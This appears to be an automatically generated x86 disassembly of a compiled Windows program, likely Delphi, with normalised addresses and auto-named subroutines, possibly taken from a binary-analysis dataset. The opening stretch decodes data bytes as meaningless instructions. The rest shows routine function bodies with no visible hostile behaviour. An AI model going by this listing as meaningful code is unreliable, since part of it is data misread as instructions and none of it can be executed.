add [ esp + esi * 8 + 0x47 ] ah
add al dl
hlt
add [ ebx ] cl
push edx
popad
push esp
imul ebp [ ebp + 0x65 ] 0x8b74756f
rol [ ebp * 8 + 0x47 ] 0x0
je r-xdata
inc edi
add [ eax - 0x7c ] cl
inc edi
add [ eax + 0x74004779 ] cl
jns r-xdata
mov eax eax
pushad
in al dx
jg r-xdata
add al bl
add [ eax ] al
add [ eax ] al
add [ ebp * 8 + 0x47 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in eax dx
inc edi
add [ eax ] al
add [ edi ] al
adc [ ecx + ecx * 2 + 0x64 ] edx
dec ecx
dec edi
dec eax
popad
outsb
arpl [ ebx - 0x75 ] bp
shl [ eax - 0x14 ] 0x47
in eax dx
inc edi
add [ eax + eax ] cl
add [ eax ] ah
dec edi
inc ecx
add [ ecx + eax * 2 - 0x29c3ffc0 ] ch
inc ecx
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add al cl
aad 0x41
add al dh
salc
inc ecx
add ah dh
hlt
add [ eax ] al
or al 0xed
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] bl
je r-xdata
insb
jb r-xdata
add ah al
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ds
arpl [ ebx + 0x6c ] bp
jmp r-xdata
push ebx
add [ ecx + ebp * 8 + 0x47 ] bh
add [ ecx ] dl
push esp
dec ecx
dec ecx
dec edi
dec eax
popad
outsb
insb
jb r-xdata
add [ ecx + edi * 2 ] cl
inc edi
add [ eax + 0x18004778 ] dl
out dx eax
inc edi
add al dh
out 0x47 al
add [ eax ] dl
out 0x47 eax
add [ eax ] dh
out 0x47 eax
add [ edx + ebp * 8 + 0x47 ] ch
add [ eax ] al
sub_47ed4c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov edi eax
xor eax eax
push ebp
push sub_47ef0a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp edi 0xffffffff
jne r-xdata
cmp edi 0xfffffffe
sete bl
mov cl 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d4f8
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47eeed
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xd0 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x40 ] eax
mov eax [ ebp - 0x4 ]
call sub_41d988
mov eax [ r-xdata ]
call sub_4742e8
test al al
je r-xdata
mov edi 0xfffffffe
mov esi 0x7d
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x34 ]
cdq
push edx
push eax
push 0x0
push 0x7d
call sub_46462c
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
cmp esi edi
jge r-xdata
mov edi esi
add edi 0x1
jno r-xdata
mov esi eax
jmp r-xdata
call sub_403e2c
mov eax edi
test eax eax
jns r-xdata
mov eax esi
test eax eax
jns r-xdata
call sub_403e34
test bl bl
je r-xdata
call sub_464684
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
je r-xdata
call sub_403e2c
call sub_464684
sub edi esi
jno r-xdata
call sub_403e2c
mov eax [ ebp - 0x4 ]
call sub_41d9b0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax ]
call [ edx + 0x6c ]
mov eax [ ebp - 0x4 ]
call sub_41d9b8
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_406fd4
mov edx [ ebp - 0x8 ]
mov eax [ r-xdata ]
call sub_463298
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
je r-xdata
test bl bl
je r-xdata
call sub_403e34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47eef4
mov eax [ ebp - 0x4 ]
call sub_403f64
retn
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x44 ]
test ebx ebx
je r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_474220
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov edi esi
add edi 0x1
jno r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x48 ]
mov eax [ r-xdata ]
call sub_463298
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_46f7ac
call sub_4047d8
cmp esi edi
jl r-xdata
xor edi edi
jmp r-xdata
call sub_403e34
sub_47ef18
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x4 ] eax
lea edi [ ebp - 0x4 ]
xor eax eax
push ebp
push sub_47f151
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ edi ]
call sub_47e5dc
mov eax [ edi ]
mov ebx [ eax + 0x100 ]
test ebx ebx
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ edi ]
mov edx [ edx + 0x94 ]
call sub_404edc
mov eax [ edi ]
mov esi [ eax + 0xb0 ]
mov eax [ edi ]
movzx ebx [ eax + 0x105 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_463eb4
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x8 ]
call sub_46ee14
test al al
jne r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ edi ]
mov edx [ edx + 0x94 ]
call sub_404edc
mov eax [ edi ]
mov esi [ eax + 0xb0 ]
mov eax [ edi ]
movzx ebx [ eax + 0x105 ]
jmp r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ edi ]
mov ebx [ edx + 0x100 ]
mov edx [ ebx + 0x88 ]
call sub_404edc
mov esi [ ebx + 0x90 ]
movzx ebx [ ebx + 0x94 ]
jmp r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_404edc
mov eax [ edi ]
cmp [ eax + 0x32 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_404edc
jmp r-xdata
mov eax [ edi ]
cmp [ eax + 0x32 ] 0x0
je r-xdata
test bl bl
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x8c ]
test eax eax
jne r-xdata
push 0x0
mov eax [ edi ]
mov eax [ eax + 0xd0 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
lea ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ edi ]
call sub_474648
lea eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx ebx
mov edx [ ebp - 0x8 ]
call sub_46f6f8
jmp r-xdata
push 0x0
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
lea ecx [ ebp - 0x14 ]
xor edx edx
mov eax [ edi ]
call sub_474648
push ebx
mov eax [ edi ]
mov eax [ eax + 0xd0 ]
mov ecx esi
mov edx [ ebp - 0xc ]
call sub_474db8
mov eax [ edi ]
cmp [ eax + 0x32 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov eax [ edi ]
movzx ecx [ eax + 0x105 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x8 ]
call sub_46f6f8
jmp r-xdata
push 0x0
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
lea ecx [ ebp - 0x14 ]
xor edx edx
mov eax [ edi ]
call sub_474648
push ebp
call sub_47ed4c
pop ecx
mov eax [ r-xdata ]
call sub_4742e8
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47f158
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_404e68
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
mov eax [ edi ]
mov eax [ eax + 0xd0 ]
mov edx [ eax ]
call [ edx + 0x24 ]
jmp r-xdata
push ebp
mov eax 0x1d4c0
call sub_47ed4c
pop ecx
jmp r-xdata
mov eax [ edi ]
mov eax [ eax + 0xb0 ]
push eax
mov eax [ edi ]
movzx eax [ eax + 0x105 ]
push eax
mov eax [ edi ]
mov ecx [ eax + 0x94 ]
mov eax [ edi ]
mov eax [ eax + 0x100 ]
mov edx [ edi ]
call sub_4791dc
mov eax [ edi ]
mov ebx [ eax + 0x100 ]
test ebx ebx
je r-xdata
sub_47f16c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebx eax
mov edx [ esp ]
mov eax ebx
call sub_478ee8
mov eax [ esp ]
mov eax [ eax ]
call sub_406248
mov [ esp + 0x4 ] eax
xor esi esi
push eax
mov edx [ esp + 0x4 ]
mov edx [ edx ]
mov ecx esi
mov eax [ ebx + 0xd0 ]
call sub_474c1c
mov edi eax
xor ecx ecx
xor edx edx
mov eax [ r-xdata ]
call sub_474220
test edi edi
sete al
mov [ ebx + 0x89 ] al
xor ecx ecx
mov dl 0x1
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x64 ]
mov eax edi
cdq
push edx
push eax
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
add esi edi
jno r-xdata
call sub_403e34
cmp esi [ esp + 0x4 ]
jl r-xdata
call sub_403e34
mov eax [ esp + 0x4 ]
sub eax esi
jno r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_47f200
push ebp
mov ebp esp
push ecx
mov ecx 0x4
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x9 ] dl
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_47f451
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x10 ] 0xffffffff
jne r-xdata
xor ebx ebx
xor ecx ecx
movzx edx [ ebp - 0x9 ]
mov eax [ ebp - 0x8 ]
mov esi [ eax ]
call [ esi + 0x64 ]
mov eax [ ebp - 0x8 ]
call sub_47e928
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xb8 ]
cmp eax 0xffffffff
je r-xdata
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xfffffffe
jmp r-xdata
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47f458
lea eax [ ebp - 0x24 ]
mov edx 0x4
call sub_404e68
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_406410
retn
lea edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x24 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x20 ]
movzx edx [ ebp + 0x8 ]
mov eax [ r-xdata ]
call sub_46328c
or ebx 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xbc ] 0x0
je r-xdata
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x1c ]
movzx edx [ ebp - 0x9 ]
mov eax [ r-xdata ]
call sub_46328c
mov eax [ ebp - 0x8 ]
call sub_47e928
test al al
je r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_406fd4
mov edx [ ebp - 0x18 ]
mov eax [ r-xdata ]
call sub_463298
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xc0 ]
push eax
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406404
add esp 0x4
xor edx edx
push ebp
push sub_47f35d
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xd0 ]
call sub_474c04
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406404
add esp 0x4
cmp [ ebp - 0x14 ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
call sub_47e928
test al al
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
sete al
mov edx [ ebp - 0x8 ]
mov [ edx + 0x89 ] al
xor ecx ecx
movzx edx [ ebp - 0x9 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x64 ]
mov ebx [ ebp - 0x14 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_406410
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x9c ]
test eax eax
je r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x80 ]
test al al
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x98 ]
or ecx 0xffffffff
mov edx [ ebp - 0x4 ]
call sub_475d58
lea edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov eax [ ebp - 0x4 ]
call sub_406248
mov [ ebp - 0x14 ] eax
sub_47f464
push ebx
push esi
push ecx
mov [ esp ] cl
mov ebx edx
mov esi eax
cmp [ esi + 0x89 ] 0x0
je r-xdata
mov eax esi
call sub_47e928
xor al 0x1
mov eax esi
call sub_47e928
test al al
je r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ esi + 0x98 ] 0x0
je r-xdata
mov al 0x1
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x6c ]
mov dl 0x4
mov eax esi
call sub_47463c
mov eax [ esi + 0x98 ]
cmp [ eax + 0x20 ] 0x0
sete al
or al [ esp ]
je r-xdata
test al al
je r-xdata
test bl bl
je r-xdata
mov eax esi
call sub_478768
sub_47f4d0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x60 ]
test al al
je r-xdata
pop esi
pop ebx
retn
push 0x0
mov ecx esi
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x58 ]
sub_47f4f4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor ecx ecx
push ebp
push j_sub_404570#4
push [ fs : ecx ]
mov [ fs : ecx ] esp
xor ecx ecx
push ebp
push j_sub_404570#5
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov edx [ eax ]
call [ edx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d9b0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47f540
mov edx [ eax + 0xc ]
cmp edx 0x2719
je r-xdata
call sub_404854
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp edx 0x2736
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d9b0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_404800
sub_47f56c
add [ eax ] eax
add [ eax ] al
les eax [ edx - 0xa87ffc0 ]
inc edi
add [ ecx - 0x3ba743d ] cl
add eax 0x48
mov edx [ ebx + 0x4 ]
call sub_404e98
mov eax ebx
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
call sub_404854
mov eax [ ebp - 0x4 ]
call sub_41d9b0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x44 ] eax
sub_47f5b8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_47f5dd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47f5e4
retn
sub_47f7bc
push esi
mov esi [ eax + 0x8c ]
test esi esi
setne dl
test dl dl
je r-xdata
mov eax edx
pop esi
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x60 ]
mov edx eax
sub_47f7dc
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
mov eax [ esi + 0x8c ]
test eax eax
je r-xdata
lea edx [ esi + 0x90 ]
mov eax [ r-xdata ]
call sub_462560
lea edx [ esi + 0x88 ]
mov eax [ r-xdata ]
call sub_462560
mov edx ebx
and dl 0xfc
mov eax esi
call sub_47460c
test bl bl
jle r-xdata
mov edx [ eax ]
call [ edx + 0x6c ]
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
sub_47f83c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
xor ecx ecx
push ebp
push sub_47f8b7
push [ fs : ecx ]
mov [ fs : ecx ] esp
test dl dl
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47f8be
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x5c ]
test al al
je r-xdata
retn
cmp [ eax + 0xac ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov dl 0x3
mov eax [ ebp - 0x4 ]
call sub_47463c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
mov edx [ eax ]
call [ edx + 0x6c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x40 ]
mov dl 0x4
mov eax [ ebp - 0x4 ]
call sub_47463c
sub_47f8e4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x68 ]
push edi
mov eax [ ebx + 0x90 ]
call sub_475574
mov edx eax
add edx 0x8000
cmp edx 0xffff
jbe r-xdata
add edx 0xffff8000
mov ecx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x54 ]
pop edi
pop esi
pop ebx
retn
call sub_403e2c
sub_47f928
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47f976
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x90 ]
mov eax [ eax + 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax esi
call [ eax ]
call sub_4047d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47f97d
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_47f990
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_405314
xor eax eax
push ebp
push sub_47f9f9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_47fdb0
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x4c ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x8c ]
mov ecx [ eax ]
call [ ecx + 0x88 ]
mov edx esi
mov ecx [ ebp + 0x8 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x6c ]
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47fa00
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_47fa0c
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_41dd8c
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x8c ]
jne r-xdata
xor eax eax
mov [ edi + 0x8c ] eax
xor eax eax
mov [ edi + 0xa0 ] eax
sub_47fa44
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x8c ]
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
je r-xdata
mov [ ebx + 0x94 ] 0x0
mov eax [ ebx + 0x8c ]
test eax eax
je r-xdata
cmp [ ebx + 0x8c ] 0x0
je r-xdata
test esi esi
je r-xdata
xor edx edx
mov [ eax + 0x80 ] edx
lea edx [ ebx + 0x8c ]
mov eax [ r-xdata ]
call sub_462560
test esi esi
je r-xdata
mov [ esi + 0x80 ] ebx
xor eax eax
mov [ ebx + 0xa0 ] eax
mov eax esi
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
mov [ ebx + 0x8c ] esi
mov edx ebx
mov eax esi
call sub_41db30
mov [ ebx + 0xa0 ] esi
jmp r-xdata
test esi esi
je r-xdata
sub_47fad4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
xor ecx ecx
push ebp
push sub_47fb39
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov esi [ eax + 0x8c ]
test esi esi
je r-xdata
test dl dl
je r-xdata
xor ecx ecx
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47fb40
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
sub_47fb48
push ebp
mov ebp esp
add esp 0xfffffff4
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp eax 0xffffffff
jle r-xdata
mov eax edi
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
mov [ ebp - 0x9 ] 0x0
mov edx eax
test edx edx
jl r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
inc edx
xor esi esi
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x74 ]
call sub_403e2c
cmp esi eax
jle r-xdata
mov ecx [ ebp - 0x8 ]
cmp di [ ecx + esi * 2 ]
jne r-xdata
inc esi
dec edx
jne r-xdata
mov [ ebp - 0x9 ] 0x1
jmp r-xdata
test esi esi
jl r-xdata
sub_47fba8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_47fc7d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_47fdb0
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_47fc60
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x8c ]
mov edx 0x7fffffff
mov esi [ eax ]
call [ esi + 0xa8 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
jmp r-xdata
mov eax [ ebx + 0x90 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call [ eax + 0x38 ]
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x8c ]
call sub_477d64
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax [ ebx + 0x90 ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47fc67
lea edx [ ebp - 0x8 ]
mov eax [ r-xdata ]
call sub_462560
retn
sub_47fc8c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_405314
xor eax eax
push ebp
push sub_47fce0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x68 ]
push esi
mov eax [ ebx + 0x90 ]
mov edx [ eax + 0xc ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x58 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47fce7
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_47fcec
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_405314
mov eax [ ebp - 0x8 ]
call sub_405314
xor eax eax
push ebp
push sub_47fd5b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_404e98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47fd62
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404e68
retn
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_464d00
test al al
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x74 ]
sub_47fd6c
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_474864
mov eax ebx
mov edx [ eax ]
call [ edx + 0x44 ]
mov esi eax
mov [ ebx + 0xa4 ] esi
push 0x0
xor ecx ecx
mov dl 0x1
mov eax esi
call [ eax + 0x34 ]
mov [ ebx + 0x88 ] eax
push 0x0
xor ecx ecx
mov dl 0x1
mov eax [ ebx + 0xa4 ]
call [ eax + 0x34 ]
mov [ ebx + 0x90 ] eax
pop esi
pop ebx
retn
sub_47ff04
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403f34
mov eax esi
call sub_405120
test eax eax
jle r-xdata
add esp 0xfffffff0
call sub_404288
mov eax edi
test bl bl
je r-xdata
mov edx esi
mov eax edi
call sub_47ffe8
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_47ff54
push ebx
push esi
mov esi edx
mov ebx 0x1
jmp r-xdata
mov eax [ esi ]
call sub_405120
cmp ebx eax
jle r-xdata
mov eax [ esi ]
dec ebx
test eax eax
je r-xdata
pop esi
pop ebx
retn
call sub_403e2c
cmp ebx [ eax - 0x4 ]
jb r-xdata
inc ebx
movzx eax [ eax + ebx - 0x1 ]
call sub_4732a4
test al al
je r-xdata
mov eax [ esi ]
dec ebx
test eax eax
je r-xdata
add ebx 0x2
jno r-xdata
call sub_403e2c
cmp ebx [ eax - 0x4 ]
jb r-xdata
jmp r-xdata
call sub_403e34
inc ebx
cmp [ eax + ebx - 0x1 ] 0x5c
jne r-xdata
add ebx 0x1
jno r-xdata
mov eax esi
call j_sub_405330
dec ebx
test eax eax
je r-xdata
call sub_403e34
call sub_403e2c
cmp ebx [ eax - 0x4 ]
jb r-xdata
inc ebx
mov [ eax + ebx - 0x1 ] 0x2f
add ebx 0x1
jno r-xdata
jmp r-xdata
call sub_403e34
sub_47ffe8
push ebp
mov ebp esp
mov ecx 0x5
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_480455
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebx + 0xc ]
mov edx esi
call sub_404e98
lea edx [ ebx + 0xc ]
mov eax [ ebx ]
call sub_47ff54
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0xc ]
call sub_404edc
lea eax [ ebx + 0x18 ]
call sub_404e44
lea eax [ ebx + 0x8 ]
call sub_404e44
lea eax [ ebx + 0x14 ]
call sub_404e44
lea eax [ ebx + 0x4 ]
call sub_404e44
lea eax [ ebx + 0x10 ]
call sub_404e44
lea eax [ ebx + 0x1c ]
call sub_404e44
lea eax [ ebx + 0x20 ]
call sub_404e44
lea eax [ ebx + 0x24 ]
call sub_404e44
lea eax [ ebx + 0x28 ]
call sub_404e44
mov [ ebx + 0x2c ] 0x0
mov esi [ rw-data ]
mov esi [ esi ]
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call esi
mov esi eax
test esi esi
jle r-xdata
mov esi [ rw-data ]
mov esi [ esi ]
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call esi
mov edi eax
test edi edi
jle r-xdata
